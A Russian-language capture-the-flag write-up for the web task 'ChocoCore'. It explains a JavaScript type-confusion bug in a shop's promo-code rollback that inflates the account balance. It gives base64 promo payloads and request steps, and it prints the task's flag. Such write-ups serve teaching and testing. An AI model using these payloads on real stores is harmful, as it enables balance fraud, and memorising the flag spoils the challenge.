# Шоколадный дроп

- **Slug:** `chococore`
- **Уровень:** Medium
- **Теги:** Medium, Web, Financial, JS
- **Автор:** Никита Сычёв ([@nsychev](https://t.me/nsychev)), [SPbCTF](https://t.me/spbctf)
- **Исходная страница:** https://alfactf.ru/tasks/chococore

## Условие

В старом порту открыли первый ChocoCore — бутик премиального функционального шоколада для активной жизни. Адаптогены, суперфуды, грибные экстракты, raw-какао, начинки, от которых сносит крышу — всё для тех, кто следит за здоровьем и устал жевать один протеин.

Многие уже заценили  серийные плитки, и в чатах теперь обсуждают лимитированный дроп. Сегодня стартовали продажи.

Станьте первым, кто его попробует: chococore-h7arfq5w.alfactf.ru/

Исходный код: chococore_b3347ee.tar.gz

Вход: [**https://chococore-h7arfq5w.alfactf.ru/**](https://chococore-h7arfq5w.alfactf.ru/)

## Вложения

- [`chococore_b3347ee.tar.gz`](./files/chococore_b3347ee.tar.gz)

---

## Решение

### Категория
**Web**

### URL/artifacts
- URL: https://chococore-h7arfq5w.alfactf.ru/
- Исходный код: [`chococore_b3347ee.tar.gz`](./files/chococore_b3347ee.tar.gz)


### Статус
**SOLVED**

### Флаг
`alfa{5hu7_UP_4nd_SELl_Me_moRE_THESe_CH0CoL47E5}`

### Наблюдения

1. **Интернет-магазин шоколада** - Next.js приложение с API для промокодов и покупок
2. **Промокод TREAT5000** - дает 5000 рублей на счет, но флаговый шоколад стоит 31337 рублей
3. **Type confusion в `/api/promocode`** - уязвимость в обработке типа amount в промокодах
4. **JavaScript строковая конкатенация vs численное вычитание** - ключевая особенность языка

### Решение

#### Первоначальная разведка

Анализ исходного кода показал Next.js приложение интернет-магазина шоколада с API эндпоинтами:
- `/api/session` - управление сессией пользователя и балансом
- `/api/promocode` - активация промокодов
- `/api/cart` - добавление товаров в корзину
- `/api/checkout` - оформление заказа
- `/api/completed` - получение информации о завершенном заказе

В коде обнаружен флаговый шоколад с id="flag" и ценой 31337 рублей, который возвращает флаг при успешной покупке.

#### Hypothesis

Изучение `/api/promocode/route.ts` выявил критическую уязвимость в строках 31-49:

```typescript
session.balance += promo.amount;  // LINE 31

try {
  if (typeof promo.amount !== 'number' || typeof promo.coupon !== 'string') {
    throw new Error('Invalid promocode');
  }
  // ... validation logic
} catch (error) {
  session.balance -= promo.amount;  // LINE 46 - rollback
  return NextResponse.json({ error: (error as Error).message }, { status: 400 });
} finally {
  updateSessionBalance(sessionId, session.balance);  // LINE 49 - persist
}
```

**Type Confusion Bug**: Когда `promo.amount` является строкой, а `session.balance` - числом:
- Строка 31: `+=` выполняет строковую конкатенацию 
- Строка 46: `-=` выполняет численное вычитание
- Строка 49: `finally` блок всегда сохраняет итоговый баланс

#### Exploit

**Пример с balance=5000 и amount="1":**
1. `5000 += "1"` → `"50001"` (строковая конкатенация)
2. Валидация падает (typeof amount !== 'number')
3. `"50001" -= "1"` → `50000` (численное вычитание: Number("50001") - Number("1"))
4. `finally` блок сохраняет balance = 50000

**Шаги эксплуатации:**

1. **Bootstrap session** - получение session cookie через `/api/session`

2. **Легальное получение баланса** - активация промокода TREAT5000 для получения 5000 рублей:
   ```json
   {"code": "eyJhbW91bnQiOjUwMDAsImNvdXBvbiI6IlRSRUFUNTAwMCJ9"}
   ```

3. **Type confusion attack** - отправка промокода со строковым amount:
   ```json
   {"code": "eyJhbW91bnQiOiIxIiwiY291cG9uIjoieCJ9"}
   ```
   Base64 decode: `{"amount":"1","coupon":"x"}`
   
   Результат: 5000 + "1" = "50001" → "50001" - "1" = 50000

4. **Добавление флагового шоколада** в корзину:
   ```json
   {"chocolateId": "flag", "quantity": 1}
   ```

5. **Checkout** - баланс 50000 ≥ цена 31337, заказ успешно оформляется

6. **Получение флага** через `/api/completed` - возвращает сообщение с флагом

#### Flag Extraction

Выполнение эксплойта:

```bash
chmod +x solve/solve.sh && ./solve/solve.sh
```

Или через Python:

```bash
python3 solve/exploit.py
```

Флаг извлекается из ответа `/api/completed`:

```json
{
  "success": true,
  "message": "Спасибо за покупку! Ваш заказ #364 на 31337 ₽ оформлен. [...] специальным секретным купоном на нашу эксклюзивную дегустацию: alfa{5hu7_UP_4nd_SELl_Me_moRE_THESe_CH0CoL47E5}",
  "orderId": 364,
  "total": 31337
}
